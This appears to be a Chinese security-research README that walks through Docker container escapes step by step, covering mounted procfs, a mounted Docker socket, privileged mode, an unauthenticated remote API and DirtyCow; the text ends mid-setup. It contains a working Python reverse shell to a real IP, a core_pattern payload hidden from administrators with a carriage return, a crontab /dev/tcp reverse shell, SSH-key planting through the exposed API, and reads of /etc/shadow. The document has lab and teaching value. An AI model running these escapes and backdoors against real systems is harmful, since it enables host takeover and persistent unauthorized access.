# docker-vuls
详细的记录了一些Docker漏洞的原理、环境搭建、漏洞复现内容



## 漏洞目录
### 配置安全
- 挂载宿主机profcs逃逸
- 挂载Docker Socket逃逸
- Privileage特权模式逃逸
- API未授权

### 内核漏洞
- CVE-2016-5195 DirtyCow 逃逸

### Docker 自身漏洞
- CVE-2019-16884
- CVE-2019-5736
- CVE-2020-15257


##  漏洞复现
- 参考：https://github.com/teamssix/container-escape-check

| 配置类型\\验证方法 | 容器内验证命令 | 结果 |
| --- | --- | --- |
| Privileged 特权模式 | cat /proc/self/status &#124; grep -qi "0000003fffffffff" && echo "Is privileged mode" &#124;&#124; echo "Not privileged mode"
cat /proc/self/status &#124; grep -qi "0000001fffffffff" && echo "Is privileged mode" &#124;&#124; echo "Not privileged mode" | Is privileged mode. |
| 挂载Socket | ls /var/run/ &#124; grep -qi docker.sock && echo "Docker Socket is mounted." &#124;&#124; echo "Docker Socket is not mounted." | Docker Socket is mounted. |
| 挂载procfs | find / -name core_pattern 2>/dev/null &#124; wc -l &#124; grep -q 2 && echo "Procfs is mounted." &#124;&#124; echo "Procfs is not mounted." | Procfs is mounted. |
| 挂载宿主机根目录 | find / -name passwd 2>/dev/null &#124; grep /etc/passwd &#124; wc -l &#124; grep -q 7 && echo "Root directory is mounted." &#124;&#124; echo "Root directory is not mounted." | Root directory is mounted. |
| Docker remote api 未授权访问 | IP=`hostname -i &#124; awk -F. '{print $1 "." $2 "." $3 ".1"}' ` && timeout 3 bash -c "echo >/dev/tcp/$IP/2375" > /dev/null 2>&1 && echo "Docker Remote API Is Enabled." &#124;&#124; echo "Docker Remote API is Closed." | Docker Remote API Is Enabled. |

## [配置安全]挂载宿主机 procfs 逃逸
### 漏洞描述
procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时。
Docker默认情况下不会为容器开启 User Namespace
从 2.6.19 内核版本开始，Linux 支持在 /proc/sys/kernel/core_pattern 中使用新语法。如果该文件中的首个字符是管道符 | ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。
一般情况下不会将宿主机的 procfs 挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有这种情况发生。
### 环境配置

- 宿主机： 阿里云ECS centos7.6
- docker容器：ubuntu 18.04
- 监听机：腾讯云 centos7.6 
### 漏洞复现
#### 容器搭建
在宿主机中创建一个容器并挂载/proc目录
这里创建的容器是ubuntu的18.04版本，高版本apt会安装失败
```bash
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu:18.04
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665541008635-113dae4e-5b56-403f-8a2c-006db58c752b.png#averageHue=%23070403&clientId=u0f42f4aa-7114-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=49&id=uab111328&margin=%5Bobject%20Object%5D&name=image.png&originHeight=74&originWidth=932&originalType=binary&ratio=1&rotation=0&showTitle=false&size=7597&status=error&style=none&taskId=ufc796b8f-78eb-4576-aa77-28322676303&title=&width=621.3333333333334)
#### 挂载检测
进入容器后如果在容器中找到两个 core_pattern 文件，那可能就是挂载了宿主机的 procfs

```bash
find / -name core_pattern
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665541059680-36137384-e6fd-4822-a436-33ab3095be2e.png#averageHue=%23220d09&clientId=u0f42f4aa-7114-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=67&id=u3a243081&margin=%5Bobject%20Object%5D&name=image.png&originHeight=100&originWidth=437&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6208&status=error&style=none&taskId=uc9685874-34b5-49f5-a8eb-04a09437b34&title=&width=291.3333333333333)
#### 查找路径
找到当前容器在宿主机下的绝对路径
```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665541304519-0057077d-aa95-4841-a8e7-6987773c5511.png#averageHue=%2318100b&clientId=u0f42f4aa-7114-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=23&id=ua3f65709&margin=%5Bobject%20Object%5D&name=image.png&originHeight=34&originWidth=752&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6257&status=error&style=none&taskId=ub8cdc23c-743f-4f20-85ae-72528ca1df8&title=&width=501.3333333333333)
#### 容器安装vim、gcc
```bash
apt-get update -y && apt-get install vim gcc -y
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665541456982-4f868b1f-ecf7-483c-ae96-2a8f7417bb11.png#averageHue=%231b140e&clientId=u0f42f4aa-7114-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=192&id=uc24fc312&margin=%5Bobject%20Object%5D&name=image.png&originHeight=288&originWidth=649&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44311&status=error&style=none&taskId=ud5aef08b-76b6-4264-8b24-5f2b4d56039&title=&width=432.6666666666667)
#### 创建反弹shell脚本
```bash
vim /tmp/.t.py
```
shell脚本内容
```bash
#!/usr/bin/python3
import  os
import pty
import socket
lhost = "43.142.177.224"
lport = 80
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    # os.remove('/tmp/.t.py')
    s.close()
if __name__ == "__main__":
    main()
```
给 Shell 赋予执行权限
```bash
chmod 777 .t.py
```
然后写入执行反弹shell命令（即运行上面的py文件）到共享的/proc目录下的core_pattern文件中:
```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo -e "|$host_path/tmp/.x.py \rcore    " >  /host/proc/sys/kernel/core_pattern
# 是以宿主机权限运行，所以py文件为当前容器文件路径在宿主机上的绝对路径
```
/proc/sys/kernel/core_pattern文件是负责进程奔溃时内存数据转储的，当第一个字符是管道符|时，后面的部分会以命令行的方式进行解析并运行。\r之后的内容主要是为了管理员通过cat命令查看内容时隐蔽我们写入恶意命令。
#### 运行崩溃程序
在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序
```bash
vim /tmp/t.c
```
t.c内容
```bash
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
```
编译运行
```bash
gcc t.c -o t
./t
```
#### 逃逸成功
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665542070004-c303fd22-d8b8-4352-a574-bd2fb6c22c20.png#averageHue=%231a1817&clientId=u0f42f4aa-7114-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=191&id=u71298ad3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=287&originWidth=1003&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22316&status=error&style=none&taskId=ucb2ed6ed-d826-4090-8664-4ffbdfdbcbd&title=&width=668.6666666666666)


## [配置安全]挂载Docker Socket逃逸
### 漏洞描述
Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：

- unix:///var/run/docker.sock(默认
- tcp://host:port
- fd://socketfd

Docker Socket是Docker守护进程监听的Unix域套接字，用来与守护进程通信——查询信息或下发命令。
### 利用条件

- 攻击者获得了 docker 容器的访问权限
- 容器已安装/var/run/docker.sock
### 环境配置

- 宿主机： 阿里云ECS centos7.6
- docker容器：ubuntu 18.04
- 监听机：腾讯云 centos7.6 
### 漏洞复现
#### 创建验证文件
在宿主机的/home目录下创建验证文件
```bash
touch /home/success.txt
```
#### 容器搭建
创建一个容器并挂载 /var/run/docker/sock 文件
```bash
docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu:18.04
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665987409752-ab64dce4-f7a2-4984-b672-f8e4f723b469.png#averageHue=%230e0a07&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=151&id=u6f4cd6a6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=227&originWidth=940&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31109&status=error&style=none&taskId=uf50b6b15-fa61-49ce-be66-04fc3b170e8&title=&width=626.6666666666666)
#### 安装Docker命令行客户端
在容器内安装Docker命令行客户端
```bash
docker exec -it with_docker_sock /bin/bash
apt-get update
apt-get install curl
curl -fsSL https://get.docker.com/ | sh
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665987423020-42629475-711a-477e-b735-9a88b5fc0f3a.png#averageHue=%23070504&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=343&id=u1f026056&margin=%5Bobject%20Object%5D&name=image.png&originHeight=514&originWidth=595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=27700&status=error&style=none&taskId=ubd9129d7-112e-4f60-9552-820708b82a5&title=&width=396.6666666666667)
#### 检测漏洞
如果存在这个文件，说明漏洞可能存在
```bash
ls -lah /var/run/docker.sock
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665987493457-8e40ffda-f0c1-4366-b6c6-7eb484d1edb8.png#averageHue=%230c0906&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=40&id=u884cb825&margin=%5Bobject%20Object%5D&name=image.png&originHeight=60&originWidth=431&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5245&status=error&style=none&taskId=uc7baa96a-a7ac-4876-bdb0-8db22bbae17&title=&width=287.3333333333333)
#### 创建新容器
在容器内部创建一个新的容器，并将宿主机/home目录挂载到新的容器内部
```bash
docker run -it -v /:/home ubuntu /bin/bash
```
#### 逃逸成功
```bash
chroot /home
```
成功挂载到宿主机的目录下
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665988342047-ffe8ba7b-150e-48b6-a05c-6bf31470fac2.png#averageHue=%230b0706&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=149&id=ud7eedd3b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=224&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22451&status=error&style=none&taskId=ua09f0b9e-9b40-41a5-bb10-7d8849dedc0&title=&width=667.3333333333334)


## [配置安全]Privileged特权模式 逃逸
### 漏洞描述
Docker 高危启动参数 -- privileged 特权模式启动容器
当操作者执行docker run --privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。
### 利用条件
privileged 特权模式启动容器
### 漏洞复现
#### 创建容器
使用 --privileged=true 创建一个容器
```bash
docker run --rm --privileged=true -it alpine
```
#### 漏洞检测
在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff
```bash
cat /proc/self/status | grep CapEff
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665989608630-fbb287ca-30ef-4694-8bdd-7ebea1e8b032.png#averageHue=%230d0806&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=134&id=u85e38f83&margin=%5Bobject%20Object%5D&name=image.png&originHeight=201&originWidth=488&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13174&status=error&style=none&taskId=u4ac5746c-61f9-4020-9638-a21b4d14803&title=&width=325.3333333333333)
#### 查看挂载磁盘设备
```bash
fdisk -l
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665989745138-31371f43-2a40-4536-befc-861851b6629b.png#averageHue=%23080604&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=109&id=u7d726226&margin=%5Bobject%20Object%5D&name=image.png&originHeight=164&originWidth=514&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9450&status=error&style=none&taskId=ua9e87109-ab0b-4729-810d-9ead3808e2d&title=&width=342.6666666666667)
在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下
```bash
mkdir /test && mount /dev/vda1 /test
```
尝试访问宿主机 shadow 文件，可以看到正常访问
```bash
cat /test/etc/shadow
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665990149841-fe4aa615-a6ec-4d78-b0c1-93a6aee002b5.png#averageHue=%230e0c0a&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=342&id=ub9d54ae6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=513&originWidth=569&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35595&status=error&style=none&taskId=u7cabb247-572d-44c0-bb08-2d0425b088e&title=&width=379.3333333333333)
#### 逃逸成功
```bash
chroot /test
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665990277662-14a7de7f-9ddb-40dd-8356-69774f54b191.png#averageHue=%23090604&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=49&id=ucc9a0c89&margin=%5Bobject%20Object%5D&name=image.png&originHeight=73&originWidth=287&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3245&status=error&style=none&taskId=u00956656-aaea-45c7-9295-6ad91ee662f&title=&width=191.33333333333334)


## [配置安全]API 未授权访问逃逸
### 漏洞详情
Docker remote api 可以执行 docker 命令，docker 守护进程监听在 0.0.0.0，可直接调用 API 来操作 docker
### 环境搭建
#### 环境配置
操作系统:  Centos7.8
Docker版本: Docker-Ce18.09.9
#### 配置阿里源
```bash
curl -o /etc/yum.repos.d/Centos-7.repo http://mirrors.aliyun.com/repo/Centos-7.repo

curl -o /etc/yum.repos.d/docker-ce.repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo

yum clean all && yum makecache && yum update
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1665992170307-eca27645-53e1-4151-af48-c4bffe2da0f9.png#averageHue=%23090604&clientId=u752b558a-d397-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=171&id=u04726e54&margin=%5Bobject%20Object%5D&name=image.png&originHeight=256&originWidth=572&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17637&status=error&style=none&taskId=u86d1a957-6599-4654-966a-db4d60bed33&title=&width=381.3333333333333)
#### 安装指定版本docker
```bash
yum install -y docker-ce-18.09.9
# 安装不了则配置一下yum源
yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.rep
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666064224785-8bb10a36-8a34-4fec-bef3-6580443fad06.png#averageHue=%230a0806&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=343&id=u112e61a2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=514&originWidth=1154&originalType=binary&ratio=1&rotation=0&showTitle=false&size=60396&status=error&style=none&taskId=u27a527f2-e669-46e0-b59e-ae2885e28df&title=&width=769.3333333333334)
配置加速源
```bash
vim /etc/docker/daemon.json
{ "registry-mirrors" : [ "https://8xpk5wnt.mirror.aliyuncs.com" ]}
```
设置开机自启
```bash
systemctl enable docker
systemctl daemon-reload
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666064492887-f83e3a09-0a71-4fc6-8aa3-446d4ab145ac.png#averageHue=%230c0805&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=47&id=u6a11b40e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=71&originWidth=864&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9323&status=error&style=none&taskId=ub30242db-7c06-48fd-89c3-82c0e1ae430&title=&width=576)
启动containerd服务
```bash
#启动containerd服务
containerd 

#查看服务状态
Systemctl status containerd 
```
开启2375端口,提供外部访问
```bash
vim /usr/lib/systemd/system/docker.service

ExecStart=/usr/bin/dockerd -H tcp://0.0.0.0:2375  -H fd:// --containerd=/run/containerd/containerd.sock
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666064705492-1854692f-b3bf-432f-8e7f-d3b3fe285c57.png#averageHue=%23221d19&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=363&id=u55ff23de&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=1265&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108690&status=error&style=none&taskId=u5625466d-c427-4456-9bed-4bfcc8878e1&title=&width=843.3333333333334)
改完之后需要重启
```bash
systemctl daemon-reload
systemctl restart docker
docker version
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666064912272-730bc73f-c4ea-4c60-bd2b-8e36833f7da7.png#averageHue=%23080605&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=223&id=uc6488d42&margin=%5Bobject%20Object%5D&name=image.png&originHeight=334&originWidth=479&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18645&status=error&style=none&taskId=u875f866b-dfb6-49cf-aaeb-b4cf2f4f999&title=&width=319.3333333333333)
检查端口开放
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666064957699-33e76b4f-e510-4926-9a39-ff708122c564.png#averageHue=%23080504&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=207&id=u5c6f1301&margin=%5Bobject%20Object%5D&name=image.png&originHeight=310&originWidth=661&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26083&status=error&style=none&taskId=u187551c5-bb01-4496-be5a-c69c5461648&title=&width=440.6666666666667)
外网访问需要打开防火墙规则
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666065081791-c84fc305-08ab-48fd-814b-47b4c72d539f.png#averageHue=%23fdfcfc&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=300&id=ue6522a44&margin=%5Bobject%20Object%5D&name=image.png&originHeight=450&originWidth=1465&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54592&status=error&style=none&taskId=u944b3701-b1e8-481c-aa60-54e790e7663&title=&width=976.6666666666666)
本地虚拟机需要关闭防火墙
```bash
# 关闭默认自带防火墙：
systemctl stop firewalld && systemctl disable firewalld

# 安装iptables管理工具，并清空规则：
yum -y install iptables-services && systemctl start iptables && systemctl enable iptables && iptables -F && service iptables save

# 第三，关闭selinux
# 下面命令先关闭selinux，然后从selinux的配置文件中设置它为永久关闭。
setenforce 0 && sed -i 's/^SELINUX=.*/SELINUX=disabled/' /etc/selinux/config
```
### 漏洞复现
直接访问目的ip:2375显示{"message":"page not found"}
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666065201117-e6e671c5-e21c-4bc5-b5c4-a43db5e3cb9f.png#averageHue=%23fdfcfc&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=117&id=u010957b3&margin=%5Bobject%20Object%5D&name=image.png&originHeight=176&originWidth=429&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6447&status=error&style=none&taskId=uf6e999e4-8314-4227-b85d-d81f32d20b0&title=&width=286)
在路径中接上/version进行验证:会返回docker的版本信息
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666065262270-cdf1c47c-01c3-4c2d-adab-e817484b0dee.png#averageHue=%23fcfcfb&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=417&id=ud685c046&margin=%5Bobject%20Object%5D&name=image.png&originHeight=626&originWidth=670&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24569&status=error&style=none&taskId=ua8e64745-ec64-4eb0-8f4b-c9a6b953d8f&title=&width=446.6666666666667)
如果能查看到对应的docker信息,则证明漏洞存在,在攻击机开启docker服务
使用docker –H tcp://靶机ip:2375 ps命令查看靶机已启动的容器,也可以查看目标机器的镜像
```bash
# 查看docker服务
docker -H tcp://120.27.21.11:2375 ps
# 查看docker镜像
docker -H tcp://120.27.21.11:2375 images
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666065665051-9b5fbe22-4dfa-48d0-bf9c-25608197f3be.png#averageHue=%23070504&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=84&id=u1984972f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=126&originWidth=627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=8630&status=error&style=none&taskId=u0d69f19c-110d-47d9-ba00-216e612802b&title=&width=418)
#### 攻击方式一  定时任务反弹shell
定时任务反弹shell需要运用到crontab服务,crontab服务写shell的需要先了解它的语法格式:

- * * * * * command #语法格式
- *的含义如下所示
- ![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666072366523-8a35d0ad-232a-4f9f-8175-8f9ebfb3697e.png#averageHue=%23f4f4f4&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&id=uc5bfb889&margin=%5Bobject%20Object%5D&name=image.png&originHeight=169&originWidth=550&originalType=url&ratio=1&rotation=0&showTitle=false&size=19701&status=error&style=none&taskId=u7b5b189d-6891-4722-bdb2-ebaf9860f7a&title=)

所以我们可以构造出反弹shell的语句: 
```bash
* * * * * /bin/bash –i >& /dev/tcp/ip/port 0>&1  # 任意时间都会反弹shell
*/1 * * * * /bin/bash –i >& /dev/tcp/ip/port 0>&1 # 每隔一分钟就会反弹shell
```
启动一个容器并挂载宿主机的mnt目录，返回其sh shell
参数说明

- run 运行容器
- --rm 容器停止时,自动删除该容器
- -v 挂载目录
- -I  指示docker在容器上打开一个标准的输入接口
- -t  指示docker要创建一个伪tty终端
```bash
# 启动容器之后退出容器就会清理掉该容器
docker -H tcp://120.27.21.11:2375 run --rm -it -v /:/mnt busybox chroot /mnt sh 
```
写入到定时任务当中，因为挂载的是宿主机的mnt目录所以定时任务将由宿主机触发从而完成逃逸
```bash
echo "*/1 * * * * /bin/bash -i >& /dev/tcp/43.142.177.224/80 0>&1" > /var/spool/cron/root 
```
##### 逃逸成功
攻击机开启nc监听,过一段时间之后就会得到宿主机反弹回来的shell了
```bash
nc -lvk 80
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666072792941-11b5f262-823f-4e93-a8f3-33fd29b5cf68.png#averageHue=%23161211&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=384&id=u4fcfd689&margin=%5Bobject%20Object%5D&name=image.png&originHeight=576&originWidth=1364&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86142&status=error&style=none&taskId=u98f47281-4dee-4cd4-8ed0-29181c9d799&title=&width=909.3333333333334)
#### 攻击方式二 写入SSH公钥进行远程连接
攻击机生成一个key,ssh-keygen –t rsa 指定rsa的加密方式生成之后会在/root/.ssh目录下
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666073489766-6769ab98-6111-402b-910a-bc57a4c941b1.png#averageHue=%230f0d0b&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=347&id=u9f526a16&margin=%5Bobject%20Object%5D&name=image.png&originHeight=520&originWidth=646&originalType=binary&ratio=1&rotation=0&showTitle=false&size=44179&status=error&style=none&taskId=ud6d1a1fd-9a9c-4b78-9e2a-b87f87a4d2c&title=&width=430.6666666666667)
进行远程创建docker并添加密钥
```bash
docker -H tcp://120.27.21.11:2375 run --rm -it -v /:/mnt busybox chroot /mnt sh
```
将公钥通过API创建的容器利用文件挂载写入宿主机的~/.ssh/authorized_keys文件中
```bash
cd ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC8Aqv9WNzyNWujw+Z5Oegv5Xmc6g+c3OOZO4sgzWTsyVwawFe+0BdSRhoc0vUCzRw111kQmWBHaeuE2HkT6qsdhKVI3X97YuXeHrOyQwYDxxK7pIAbtOKEK+oFSgD/EOToKkOfzRcjIcmj/I60nPaFY631LSGvLx5DsltvbUIF0h3KCf8LTgbg0NHL0hhJSsubyoFnU+x/I2CASfcAmH2ZYAm5EHlvuFB680xbRhZaN7r1vUPG4SlYySrE4hNOh7UR6azhDbxoz5WNGFc1mWXDlWiMNs17KfWQRmTwDxvCDbTzcerTNGIJZ/3P7ALUDoE8B/fYk2N4j7HmEqY2la9 root@source" > /root/.ssh/authorized_keys
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666074191276-6da4d40a-77bb-4930-811a-6877b9aa0334.png#averageHue=%23221d19&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=187&id=ued58296f&margin=%5Bobject%20Object%5D&name=image.png&originHeight=280&originWidth=714&originalType=binary&ratio=1&rotation=0&showTitle=false&size=40328&status=error&style=none&taskId=u2695308f-1397-4ba9-89a1-f0eacbb48ef&title=&width=476)
攻击机利用私钥进行连接
```bash
ssh -i id_rsa2 root@120.27.21.11
```
##### 逃逸成功
成功远程连接
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666074484149-840af151-5f88-4a4b-b68c-ee2b8aa5cd4d.png#averageHue=%2313100e&clientId=u92b4853e-579b-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=333&id=u40d7c534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=500&originWidth=1367&originalType=binary&ratio=1&rotation=0&showTitle=false&size=112535&status=error&style=none&taskId=uc6997b7b-b875-4946-882e-b339acb9398&title=&width=911.3333333333334)


## [内核漏洞]CVE-2016-5195 DirtyCow 逃逸
### 漏洞描述
Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition，允许恶意用户提权获取其他只读内存映射的写访问权限。 竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。
VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。 在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。 
脏牛漏洞几乎涵盖了所有主流的 Linux 发行版，同时也是一个由 Linus 本人亲手修复的漏洞。
### 利用条件
docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机。
Linux各发行版本对于该漏洞的相关信息

| 
- Centos7 /RHEL7
 | 3.10.0-327.36.3.el7 |
| --- | --- |
| 
- Cetnos6/RHEL6
 | 2.6.32-642.6.2.el6 |
| 
- Ubuntu 16.10
 | 4.8.0-26.28 |
| 
- Ubuntu 16.04
 | 4.4.0-45.66 |
| 
- Ubuntu 14.04
 | 3.13.0-100.147 |
| 
- Debian 8
 | 3.16.36-1+deb8u2 |


### 环境搭建
**宿主机安装**
Ubuntu系统镜像下载：[http://mirrors.163.com/ubuntu-releases/14.04/](http://mirrors.163.com/ubuntu-releases/14.04/)
```bash
uname -a
uname -r
cat /etc/issue
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666158837066-afa8602c-45f0-41cf-a022-82ee96decffa.png#averageHue=%23300a25&clientId=udb4687ae-39f7-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=257&id=uf4c7d527&margin=%5Bobject%20Object%5D&name=image.png&originHeight=385&originWidth=724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76166&status=error&style=none&taskId=udf513633-a4af-4e52-816b-d6b588245f0&title=&width=482.6666666666667)
### 漏洞复现
#### 本机提权
本机脏牛提权
```bash
sudo apt-get update
sudo apt-get install -y build-essential
sudo apt-get install -y nasm
sudo apt-get install -y git
sudo mkdir /dirtycow-vdso
sudo git clone https://github.com/scumjr/dirtycow-vdso.git /dirtycow-vdso
cd dirtycow-vdso
make

./0xdeadbeef 43.142.177.224:80
```
![image.png](https://cdn.nlark.com/yuque/0/2022/png/21457074/1666163796095-824bf686-6469-4752-8d44-f43de4327172.png#averageHue=%23c3eddf&clientId=udb4687ae-39f7-4&crop=0&crop=0&crop=1&crop=1&errorMessage=unknown%20error&from=paste&height=379&id=u5ffd06bd&margin=%5Bobject%20Object%5D&name=image.png&originHeight=568&originWidth=1437&originalType=binary&ratio=1&rotation=0&showTitle=false&size=258518&status=error&style=none&taskId=u2b8a7bb0-3258-4542-ad7a-bf26290b0b6&title=&width=958)

#### docker 逃逸(fail)
测试环境下载，下载不了可以本机下载再复制过去
```bash
git clone https://github.com/gebl/dirtycow-docker-vdso.git
git clone https://github.com.cnpmjs.org/gebl/dirtycow-docker-vdso.git

```
安装docker
```bash
# Ubuntu14.04安装docker教程
https://juejin.cn/post/6844903993387253768

# 安装docker-compose
sudo curl -L "https://github.com/docker/compose/releases/download/1.25.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
# 下交不了或速度较慢则换一个
